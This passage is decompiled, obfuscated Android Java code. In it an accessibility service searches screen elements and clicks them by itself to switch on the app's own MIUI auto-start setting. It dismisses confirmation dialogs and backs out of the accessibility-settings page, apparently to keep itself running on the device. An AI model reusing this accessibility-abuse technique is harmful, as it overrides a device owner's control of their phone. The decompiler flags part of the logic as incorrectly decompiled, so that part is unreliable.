    /* renamed from: f2 */
    public final void m212287f2(AccessibilityNodeInfo accessibilityNodeInfo, String str, ArrayList arrayList) {
        String string;
        String string2;
        String string3;
        String string4;
        CharSequence text = accessibilityNodeInfo.getText();
        String str2 = "";
        if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
            string = "";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
            str2 = string3;
        }
        if (string.equals(str) || str2.equals(str) || AbstractC0779a1.m213652a5(string, str, false) || AbstractC0779a1.m213652a5(str2, str, false)) {
            arrayList.add(accessibilityNodeInfo);
            m212274d8("│ │   [遍历] ✅ 匹配: text='" + string + "', desc='" + str2 + "'");
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            try {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    m212287f2(child, str, arrayList);
                }
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: f3 */
    public final Boolean m212288f3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
        } catch (Exception e) {
            AbstractC0003a2.m45c6("│ │   [点击] ❌ 异常: ", e.getMessage(), this);
        }
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            m212274d8("│ │   [点击] ✅ 直接点击成功: " + str);
            return Boolean.TRUE;
        }
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        float fCenterX = rect.centerX();
        float fCenterY = rect.centerY();
        boolean z = fCenterX > 0.0f && fCenterY > 0.0f && fCenterX < ((float) m212269d3()) && fCenterY < ((float) m212268d2());
        if (rect.width() > 0 && rect.height() > 0 && z) {
            m212274d8("│ │   [点击] 🎯 文本坐标点击: (" + fCenterX + ", " + fCenterY + ")");
            m212277e2(fCenterX, fCenterY, 50L);
            return Boolean.TRUE;
        }
        if (!z) {
            m212274d8("│ │   [点击] ⚠️ 坐标无效(" + fCenterX + ", " + fCenterY + ")，尝试父节点点击");
        }
        while (accessibilityNodeInfo.getParent() != null) {
            try {
                accessibilityNodeInfo = accessibilityNodeInfo.getParent();
                t60.m214694b5(accessibilityNodeInfo, "currentNode.parent");
                if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                    m212274d8("│ │   [点击] ✅ 父节点点击成功: " + str);
                    return Boolean.TRUE;
                }
            } catch (Exception unused) {
            }
        }
        return Boolean.FALSE;
    }

    /* renamed from: f4 */
    public final boolean m212289f4(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                m212274d8("│ │   [弹窗] ✓ 节点直接点击成功");
                return true;
            }
            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
            for (int i = 0; parent != null && i < 3; i++) {
                if (parent.isClickable() && parent.performAction(16)) {
                    m212274d8("│ │   [弹窗] ✓ 父节点(第" + (i + 1) + "层)点击成功");
                    return true;
                }
                parent = parent.getParent();
            }
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.width() <= 0 || rect.height() <= 0) {
                return false;
            }
            float fExactCenterX = rect.exactCenterX();
            float fExactCenterY = rect.exactCenterY();
            m212274d8("│ │   [弹窗] 🎯 坐标点击: (" + fExactCenterX + ", " + fExactCenterY + ")");
            m212277e2(fExactCenterX, fExactCenterY, 50L);
            return true;
        } catch (Exception e) {
            AbstractC0003a2.m45c6("│ │   [弹窗] ⚠️ 点击异常: ", e.getMessage(), this);
            return false;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Path cross not found for [B:40:0x01d3, B:63:0x0241], limit reached: 183 */
    /* JADX WARN: Path cross not found for [B:70:0x0266, B:78:0x028b], limit reached: 183 */
    /* JADX WARN: Removed duplicated region for block: B:110:0x0375  */
    /* JADX WARN: Removed duplicated region for block: B:112:0x037f  */
    /* JADX WARN: Removed duplicated region for block: B:116:0x03a5  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x03cf  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x03eb  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x041f  */
    /* JADX WARN: Removed duplicated region for block: B:129:0x0436  */
    /* JADX WARN: Removed duplicated region for block: B:130:0x043b  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x0440  */
    /* JADX WARN: Removed duplicated region for block: B:134:0x0448  */
    /* JADX WARN: Removed duplicated region for block: B:144:0x048d  */
    /* JADX WARN: Removed duplicated region for block: B:148:0x0498  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x04b7 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:167:0x0264 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:184:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:186:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:192:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:31:0x018a  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x024e A[LOOP:1: B:34:0x01b0->B:67:0x024e, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:81:0x0291  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x02d9  */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0018  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x02e6  */
    /* JADX WARN: Removed duplicated region for block: B:93:0x02e9  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x0318  */
    /* JADX WARN: Type inference failed for: r10v22, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r12v10, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r12v6, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r5v1, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r5v17 */
    /* JADX WARN: Type inference failed for: r5v18, types: [boolean] */
    /* JADX WARN: Type inference failed for: r5v19 */
    /* JADX WARN: Type inference failed for: r5v2, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r5v3, types: [java.util.List] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:107:0x0355 -> B:108:0x035a). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:124:0x0413 -> B:18:0x0075). Please report as a decompilation issue!!! */
    /* renamed from: f5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212290f5(boolean z, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$1;
        int i;
        C0367a4 c0367a4;
        boolean z2;
        boolean z3;
        List listM213306g5;
        int i2;
        int i3;
        ArrayList<String> arrayList;
        int i4;
        int i5;
        int i6;
        boolean z4;
        List list;
        C0367a4 c0367a42;
        String str;
        String str2;
        String str3;
        String str4;
        hg0 hg0Var;
        CoroutineSingletons coroutineSingletons;
        int i7;
        Object obj;
        int i8;
        int i9;
        ArrayList arrayList2;
        ArrayList arrayList3;
        Boolean boolM212275d9;
        C0367a4 c0367a43;
        String str5;
        Iterator it;
        MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$12;
        int i10;
        ArrayList arrayList4;
        int i11;
        C0367a4 c0367a44;
        CoroutineSingletons coroutineSingletons2;
        boolean z5;
        String string;
        int i12;
        String str6;
        Iterator it2;
        C0367a4 c0367a45;
        ArrayList arrayList5;
        String str7;
        int i13;
        List list2;
        int i14;
        String str8;
        C0367a4 c0367a46;
        ArrayList arrayList6;
        C0367a4 c0367a47;
        C0367a4 c0367a48;
        Iterator it3;
        ?? r5;
        AccessibilityNodeInfo accessibilityNodeInfoM212265c8;
        if (continuationImpl instanceof MiuiSteps$verifyAndEnableAutoStart$1) {
            miuiSteps$verifyAndEnableAutoStart$1 = (MiuiSteps$verifyAndEnableAutoStart$1) continuationImpl;
            int i15 = miuiSteps$verifyAndEnableAutoStart$1.f54493a9;
            if ((i15 & Integer.MIN_VALUE) != 0) {
                miuiSteps$verifyAndEnableAutoStart$1.f54493a9 = i15 - Integer.MIN_VALUE;
            } else {
                miuiSteps$verifyAndEnableAutoStart$1 = new MiuiSteps$verifyAndEnableAutoStart$1(this, continuationImpl);
            }
        }
        MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$13 = miuiSteps$verifyAndEnableAutoStart$1;
        Object objM212285f0 = miuiSteps$verifyAndEnableAutoStart$13.f54491a7;
        CoroutineSingletons coroutineSingletons3 = CoroutineSingletons.f57606a0;
        int i16 = miuiSteps$verifyAndEnableAutoStart$13.f54493a9;
        String str9 = "」";
        String str10 = "│ │";
        String str11 = "选项";
        String str12 = "快捷方式";
        hg0 hg0Var2 = f55086a5;
        switch (i16) {
            case 0:
                kg1.m213544f4(objM212285f0);
                miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = this;
                miuiSteps$verifyAndEnableAutoStart$13.f54488a4 = z;
                miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 1;
                i = 5;
                if (m212294f9(2, 100L, 2000L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons3) {
                    return coroutineSingletons3;
                }
                c0367a4 = this;
                z2 = z;
                ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213301i8(u91.f60354a5, i), AbstractC0715je.m213301i8(hg0Var2.getTEXTS_NOTIFICATION(), i)), AbstractC0715je.m213301i8(hg0Var2.getTEXTS_AUTO_START(), i)), AbstractC0716jf.m213306g5("存储占用", "流量使用情况", "电量使用详情", "Storage", "Data usage", "Battery usage"));
                z3 = z2;
                listM213306g5 = AbstractC0716jf.m213306g5("使用", "无障碍服务", "快捷方式", "选项");
                i2 = 0;
                i3 = 4;
                arrayList = arrayListM213298i5;
                i4 = 1;
                if (i4 >= i3) {
                    hg0Var = hg0Var2;
                    c0367a4.m212274d8("│ │   🔍 验证页面 (第" + i4 + "次)...");
                    dqtvuisjd dqtvuisjdVar = c0367a4.f55106a0;
                    AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        Iterator it4 = listM213306g5.iterator();
                        boolean z6 = false;
                        while (true) {
                            if (it4.hasNext()) {
                                str = str9;
                                String str13 = (String) it4.next();
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str13);
                                if (listFindAccessibilityNodeInfosByText != null) {
                                    coroutineSingletons2 = coroutineSingletons3;
                                    str2 = str10;
                                    if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        Iterator<AccessibilityNodeInfo> it5 = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it5.hasNext()) {
                                            AccessibilityNodeInfo next = it5.next();
                                            if (next.isVisibleToUser()) {
                                                Iterator<AccessibilityNodeInfo> it6 = it5;
                                                if (AbstractC0003a2.m24a5(next).top < c0367a4.m212268d2() * 0.4f) {
                                                    CharSequence text = next.getText();
                                                    if (text == null || (string = text.toString()) == null) {
                                                        string = "";
                                                    }
                                                    if (t60.m214686a2(str13, "无障碍服务") || t60.m214686a2(str13, str12) || AbstractC0779a1.m213652a5(string, "使用", false) || string.equals(str11)) {
                                                        str3 = str11;
                                                        str4 = str12;
                                                        c0367a4.m212274d8(AbstractC0003a2.m34b5("│ │   ⚠️ 检测到无障碍服务页面: ", string, " (关键词:", str13, ")"));
                                                        z6 = true;
                                                        if (z6) {
                                                            str9 = str;
                                                            str10 = str2;
                                                            coroutineSingletons3 = coroutineSingletons2;
                                                            str11 = str3;
                                                            str12 = str4;
                                                        }
                                                    }
                                                }
                                                it5 = it6;
                                            }
                                        }
                                    }
                                } else {
                                    coroutineSingletons2 = coroutineSingletons3;
                                    str2 = str10;
                                }
                                str3 = str11;
                                str4 = str12;
                                if (z6) {
                                }
                            } else {
                                coroutineSingletons2 = coroutineSingletons3;
                                str = str9;
                                str2 = str10;
                                str3 = str11;
                                str4 = str12;
                            }
                        }
                        if (!z6) {
                            for (String str14 : arrayList) {
                                if (rootInActiveWindow.findAccessibilityNodeInfosByText(str14) != null && (!r9.isEmpty())) {
                                    AbstractC0003a2.m45c6("│ │   ✅ 找到应用详情特征: ", str14, c0367a4);
                                    z5 = true;
                                    rootInActiveWindow.recycle();
                                    if (z6) {
                                        coroutineSingletons = coroutineSingletons2;
                                        i9 = 4;
                                        if (z5) {
                                            c0367a4.m212274d8("│ │   ✅ 页面验证成功，在应用详情页面");
                                            i2 = 1;
                                        }
                                    } else {
                                        c0367a4.m212274d8("│ │   ⚠️ 当前在无障碍服务页面，按返回键退出...");
                                        dqtvuisjdVar.performGlobalAction(1);
                                        miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a4;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = arrayList;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54486a2 = listM213306g5;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54488a4 = z3;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54489a5 = i2;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54490a6 = i4;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 2;
                                        coroutineSingletons = coroutineSingletons2;
                                        if (b81.m210571b1(150L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons) {
                                            return coroutineSingletons;
                                        }
                                        int i17 = i4;
                                        i6 = i2;
                                        i5 = i17;
                                        List list3 = listM213306g5;
                                        arrayList3 = arrayList;
                                        z4 = z3;
                                        list = list3;
                                        c0367a42 = c0367a4;
                                        c0367a42.m212274d8("│ │   🔄 重新打开应用详情...");
                                        miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a42;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = arrayList3;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54486a2 = list;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54488a4 = z4;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54489a5 = i6;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54490a6 = i5;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 3;
                                        boolM212275d9 = c0367a42.m212275d9();
                                        if (boolM212275d9 != coroutineSingletons) {
                                            return coroutineSingletons;
                                        }
                                        int i18 = i5;
                                        obj = boolM212275d9;
                                        i7 = i18;
                                        arrayList2 = arrayList3;
                                        if (((Boolean) obj).booleanValue()) {
                                            return Boolean.FALSE;
                                        }
                                        miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a42;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = arrayList2;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54486a2 = list;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54488a4 = z4;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54489a5 = i6;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54490a6 = i7;
                                        i9 = 4;
                                        miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 4;
                                        MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$14 = miuiSteps$verifyAndEnableAutoStart$13;
                                        C0367a4 c0367a49 = c0367a42;
                                        if (c0367a49.m212294f9(2, 100L, 2000L, miuiSteps$verifyAndEnableAutoStart$14) == coroutineSingletons) {
                                            return coroutineSingletons;
                                        }
                                        i8 = i7;
                                        miuiSteps$verifyAndEnableAutoStart$13 = miuiSteps$verifyAndEnableAutoStart$14;
                                        List list4 = list;
                                        z3 = z4;
                                        arrayList = arrayList2;
                                        listM213306g5 = list4;
                                        c0367a4 = c0367a49;
                                        int i19 = i6;
                                        i4 = i8 + 1;
                                        i2 = i19;
                                        coroutineSingletons3 = coroutineSingletons;
                                        i3 = i9;
                                        hg0Var2 = hg0Var;
                                        str9 = str;
                                        str10 = str2;
                                        str11 = str3;
                                        str12 = str4;
                                        if (i4 >= i3) {
                                            str = str9;
                                            str2 = str10;
                                            hg0Var = hg0Var2;
                                            coroutineSingletons = coroutineSingletons3;
                                        }
                                    }
                                }
                            }
                        }
                        z5 = false;
                        rootInActiveWindow.recycle();
                        if (z6) {
                        }
                    } else {
                        str = str9;
                        str2 = str10;
                        str3 = str11;
                        str4 = str12;
                        i9 = 4;
                        coroutineSingletons = coroutineSingletons3;
                    }
                    miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a4;
                    miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = arrayList;
                    miuiSteps$verifyAndEnableAutoStart$13.f54486a2 = listM213306g5;
                    miuiSteps$verifyAndEnableAutoStart$13.f54488a4 = z3;
                    miuiSteps$verifyAndEnableAutoStart$13.f54489a5 = i2;
                    miuiSteps$verifyAndEnableAutoStart$13.f54490a6 = i4;
                    miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 5;
                    C0367a4 c0367a410 = c0367a4;
                    MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$15 = miuiSteps$verifyAndEnableAutoStart$13;
                    if (c0367a410.m212294f9(2, 100L, 500L, miuiSteps$verifyAndEnableAutoStart$15) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    arrayList4 = arrayList;
                    i11 = i2;
                    c0367a44 = c0367a410;
                    miuiSteps$verifyAndEnableAutoStart$13 = miuiSteps$verifyAndEnableAutoStart$15;
                    int i20 = i11;
                    arrayList = arrayList4;
                    c0367a4 = c0367a44;
                    i8 = i4;
                    i6 = i20;
                    int i192 = i6;
                    i4 = i8 + 1;
                    i2 = i192;
                    coroutineSingletons3 = coroutineSingletons;
                    i3 = i9;
                    hg0Var2 = hg0Var;
                    str9 = str;
                    str10 = str2;
                    str11 = str3;
                    str12 = str4;
                    if (i4 >= i3) {
                    }
                }
                MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$16 = miuiSteps$verifyAndEnableAutoStart$13;
                c0367a43 = c0367a4;
                if (i2 == 0) {
                    c0367a43.m212274d8("│ │   ⚠️ 页面验证失败，但继续尝试...");
                }
                str5 = str2;
                c0367a43.m212274d8(str5);
                c0367a43.m212274d8("│ │ 🔹 [13.2] 开启「自启动」开关");
                ArrayList arrayListM213298i52 = AbstractC0715je.m213298i5(hg0Var.getTEXTS_AUTO_START(), u91.f60352a3);
                it = arrayListM213298i52.iterator();
                miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$16;
                i10 = 0;
                if (it.hasNext()) {
                    str6 = (String) it.next();
                    miuiSteps$verifyAndEnableAutoStart$12.f54484a0 = c0367a43;
                    miuiSteps$verifyAndEnableAutoStart$12.f54485a1 = arrayListM213298i52;
                    miuiSteps$verifyAndEnableAutoStart$12.f54486a2 = it;
                    miuiSteps$verifyAndEnableAutoStart$12.f54487a3 = str6;
                    miuiSteps$verifyAndEnableAutoStart$12.f54489a5 = i10;
                    miuiSteps$verifyAndEnableAutoStart$12.f54493a9 = 6;
                    Object objM212285f02 = c0367a43.m212285f0(str6, true, miuiSteps$verifyAndEnableAutoStart$12);
                    if (objM212285f02 == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    arrayList5 = arrayListM213298i52;
                    it2 = it;
                    i12 = i10;
                    c0367a45 = c0367a43;
                    objM212285f0 = objM212285f02;
                    miuiSteps$verifyAndEnableAutoStart$13 = miuiSteps$verifyAndEnableAutoStart$12;
                    if (!((Boolean) objM212285f0).booleanValue()) {
                        c0367a45.m212274d8("│ │   ✅ 开启「" + str6 + str);
                        miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$13;
                        list2 = arrayList5;
                        c0367a43 = c0367a45;
                        i14 = 1;
                        i13 = 1;
                        if (i14 == 0) {
                            c0367a43.m212274d8("│ │   ⚠️ 未找到自启动开关");
                            return Boolean.FALSE;
                        }
                        c0367a43.m212274d8(str5);
                        c0367a43.m212274d8("│ │ 🔹 [13.2.1] 处理确认弹窗");
                        miuiSteps$verifyAndEnableAutoStart$12.f54484a0 = c0367a43;
                        miuiSteps$verifyAndEnableAutoStart$12.f54485a1 = list2;
                        str8 = null;
                        miuiSteps$verifyAndEnableAutoStart$12.f54486a2 = null;
                        miuiSteps$verifyAndEnableAutoStart$12.f54487a3 = null;
                        miuiSteps$verifyAndEnableAutoStart$12.f54493a9 = 8;
                        if (c0367a43.m212271d5(miuiSteps$verifyAndEnableAutoStart$12) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        c0367a46 = c0367a43;
                        miuiSteps$verifyAndEnableAutoStart$13 = miuiSteps$verifyAndEnableAutoStart$12;
                        miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a46;
                        miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = list2;
                        miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 9;
                        if (b81.m210571b1(300L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        c0367a47 = c0367a46;
                        miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a47;
                        miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = list2;
                        miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 10;
                        if (c0367a47.m212294f9(2, 100L, 500L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        c0367a48 = c0367a47;
                        it3 = list2.iterator();
                        while (true) {
                            if (it3.hasNext()) {
                                r5 = 0;
                            } else {
                                AccessibilityNodeInfo accessibilityNodeInfoM212266c9 = c0367a48.m212266c9((String) it3.next());
                                if (accessibilityNodeInfoM212266c9 != null && (accessibilityNodeInfoM212265c8 = c0367a48.m212265c8(accessibilityNodeInfoM212266c9, str8)) != null && accessibilityNodeInfoM212265c8.isChecked()) {
                                    c0367a48.m212274d8("│ │   ✅ 验证成功：自启动已开启");
                                    r5 = i13;
                                }
                            }
                        }
                        return Boolean.valueOf((boolean) r5);
                    }
                    str7 = str;
                    miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a45;
                    miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = arrayList5;
                    miuiSteps$verifyAndEnableAutoStart$13.f54486a2 = it2;
                    miuiSteps$verifyAndEnableAutoStart$13.f54487a3 = str6;
                    miuiSteps$verifyAndEnableAutoStart$13.f54489a5 = i12;
                    miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 7;
                    c0367a45.getClass();
                    c0367a45.m212274d8("│ │   [开启开关] " + str6);
                    i13 = 1;
                    objM212285f0 = c0367a45.m212285f0(str6, true, miuiSteps$verifyAndEnableAutoStart$13);
                    arrayList6 = arrayList5;
                    if (objM212285f0 == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    i10 = i12;
                    miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$13;
                    it = it2;
                    c0367a43 = c0367a45;
                    if (((Boolean) objM212285f0).booleanValue()) {
                        str = str7;
                        arrayListM213298i52 = arrayList6;
                        if (it.hasNext()) {
                            i13 = 1;
                            list2 = arrayListM213298i52;
                            i14 = i10;
                            if (i14 == 0) {
                            }
                        }
                    } else {
                        c0367a43.m212274d8("│ │   ✅ enableSwitchByText成功: 「" + str6 + str7);
                        i14 = i13;
                        list2 = arrayList6;
                        if (i14 == 0) {
                        }
                    }
                }
                break;
            case 1:
                z2 = miuiSteps$verifyAndEnableAutoStart$13.f54488a4;
                C0367a4 c0367a411 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                c0367a4 = c0367a411;
                i = 5;
                ArrayList arrayListM213298i53 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213301i8(u91.f60354a5, i), AbstractC0715je.m213301i8(hg0Var2.getTEXTS_NOTIFICATION(), i)), AbstractC0715je.m213301i8(hg0Var2.getTEXTS_AUTO_START(), i)), AbstractC0716jf.m213306g5("存储占用", "流量使用情况", "电量使用详情", "Storage", "Data usage", "Battery usage"));
                z3 = z2;
                listM213306g5 = AbstractC0716jf.m213306g5("使用", "无障碍服务", "快捷方式", "选项");
                i2 = 0;
                i3 = 4;
                arrayList = arrayListM213298i53;
                i4 = 1;
                if (i4 >= i3) {
                }
                MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$162 = miuiSteps$verifyAndEnableAutoStart$13;
                c0367a43 = c0367a4;
                if (i2 == 0) {
                }
                str5 = str2;
                c0367a43.m212274d8(str5);
                c0367a43.m212274d8("│ │ 🔹 [13.2] 开启「自启动」开关");
                ArrayList arrayListM213298i522 = AbstractC0715je.m213298i5(hg0Var.getTEXTS_AUTO_START(), u91.f60352a3);
                it = arrayListM213298i522.iterator();
                miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$162;
                i10 = 0;
                if (it.hasNext()) {
                }
                break;
            case 2:
                i5 = miuiSteps$verifyAndEnableAutoStart$13.f54490a6;
                i6 = miuiSteps$verifyAndEnableAutoStart$13.f54489a5;
                z4 = miuiSteps$verifyAndEnableAutoStart$13.f54488a4;
                list = (List) miuiSteps$verifyAndEnableAutoStart$13.f54486a2;
                ?? r52 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a42 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                str = "」";
                str2 = "│ │";
                str3 = "选项";
                str4 = "快捷方式";
                hg0Var = hg0Var2;
                coroutineSingletons = coroutineSingletons3;
                arrayList3 = r52;
                c0367a42.m212274d8("│ │   🔄 重新打开应用详情...");
                miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a42;
                miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = arrayList3;
                miuiSteps$verifyAndEnableAutoStart$13.f54486a2 = list;
                miuiSteps$verifyAndEnableAutoStart$13.f54488a4 = z4;
                miuiSteps$verifyAndEnableAutoStart$13.f54489a5 = i6;
                miuiSteps$verifyAndEnableAutoStart$13.f54490a6 = i5;
                miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 3;
                boolM212275d9 = c0367a42.m212275d9();
                if (boolM212275d9 != coroutineSingletons) {
                }
                break;
            case 3:
                int i21 = miuiSteps$verifyAndEnableAutoStart$13.f54490a6;
                i6 = miuiSteps$verifyAndEnableAutoStart$13.f54489a5;
                z4 = miuiSteps$verifyAndEnableAutoStart$13.f54488a4;
                list = (List) miuiSteps$verifyAndEnableAutoStart$13.f54486a2;
                ?? r53 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a42 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                i7 = i21;
                str = "」";
                str2 = "│ │";
                str3 = "选项";
                str4 = "快捷方式";
                hg0Var = hg0Var2;
                obj = objM212285f0;
                coroutineSingletons = coroutineSingletons3;
                arrayList2 = r53;
                if (((Boolean) obj).booleanValue()) {
                }
                break;
            case 4:
                i8 = miuiSteps$verifyAndEnableAutoStart$13.f54490a6;
                i6 = miuiSteps$verifyAndEnableAutoStart$13.f54489a5;
                boolean z7 = miuiSteps$verifyAndEnableAutoStart$13.f54488a4;
                List list5 = (List) miuiSteps$verifyAndEnableAutoStart$13.f54486a2;
                ?? r54 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                C0367a4 c0367a412 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                str = "」";
                str2 = "│ │";
                str3 = "选项";
                str4 = "快捷方式";
                hg0Var = hg0Var2;
                i9 = 4;
                coroutineSingletons = coroutineSingletons3;
                z3 = z7;
                arrayList = r54;
                listM213306g5 = list5;
                c0367a4 = c0367a412;
                int i1922 = i6;
                i4 = i8 + 1;
                i2 = i1922;
                coroutineSingletons3 = coroutineSingletons;
                i3 = i9;
                hg0Var2 = hg0Var;
                str9 = str;
                str10 = str2;
                str11 = str3;
                str12 = str4;
                if (i4 >= i3) {
                }
                MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$1622 = miuiSteps$verifyAndEnableAutoStart$13;
                c0367a43 = c0367a4;
                if (i2 == 0) {
                }
                str5 = str2;
                c0367a43.m212274d8(str5);
                c0367a43.m212274d8("│ │ 🔹 [13.2] 开启「自启动」开关");
                ArrayList arrayListM213298i5222 = AbstractC0715je.m213298i5(hg0Var.getTEXTS_AUTO_START(), u91.f60352a3);
                it = arrayListM213298i5222.iterator();
                miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$1622;
                i10 = 0;
                if (it.hasNext()) {
                }
                break;
            case 5:
                i4 = miuiSteps$verifyAndEnableAutoStart$13.f54490a6;
                i11 = miuiSteps$verifyAndEnableAutoStart$13.f54489a5;
                z3 = miuiSteps$verifyAndEnableAutoStart$13.f54488a4;
                listM213306g5 = (List) miuiSteps$verifyAndEnableAutoStart$13.f54486a2;
                ?? r10 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a44 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                str = "」";
                str2 = "│ │";
                arrayList4 = r10;
                str3 = "选项";
                str4 = "快捷方式";
